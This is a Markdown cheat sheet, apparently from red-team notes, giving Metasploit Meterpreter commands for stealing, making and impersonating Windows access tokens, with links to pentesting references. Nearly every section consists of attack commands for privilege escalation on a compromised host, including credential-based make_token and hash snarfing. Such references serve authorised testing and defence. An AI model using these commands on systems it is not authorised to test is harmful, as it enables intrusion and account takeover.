# Metasploit

## Help Menu

TODO: Fill this info

```
meterpreter > load incognito

Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token
```

## 01 - Steal Token

```
meterpreter > steal_token <pid>
```

Enumerate current user and process identifier.

```
meterpreter > getuid

meterpreter > getpid
```

Drop token to revert back to original self.

```
meterpreter > drop_token
```

## 02 - Make Token

```
meterpreter > run post/windows/manage/make_token domain=<domain> username=<username> password=<password>
```

Enumerate current user with privileges.

```
meterpreter > getuid

meterpreter > getprivs
```

## 03 - Token Impersonation

List available usernames as delegation tokens to impersonate.

```
meterpreter > list_tokens -u

meterpreter > run post/windows/gather/enum_tokens

meterpreter > run post/windows/gather/enum_domain_tokens
```

List available groups as delegation tokens to impersonate.

```
meterpreter > list_tokens -g
```

Impersonate token.

```
meterpreter > impersonate_token "<DOMAIN>\<username>"
```

Enumerate current user with privileges.

```
meterpreter > getuid

meterpreter > getprivs
```

## 04 - Revert Token

Revert back to original privileges.

```
meterpreter > rev2self
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - Make Token Manage Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/make_token.md)

### Pentest Lab

- [Pentestlab Blog: Token Stealing and Incognito](https://pentestlab.blog/2012/08/07/token-stealing-and-incognito/)

### NCCGroup

- [NCCGroup: Demystifying Cobalt Strikeâ€™s "make_token" Command](https://research.nccgroup.com/2023/11/10/demystifying-cobalt-strikes-make_token-command/)

### DMCXBlue

- [DMCXBlue: Privilege Escalation Access Token Manipulation](https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation)

### Exploit Database

- [Exploit DB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)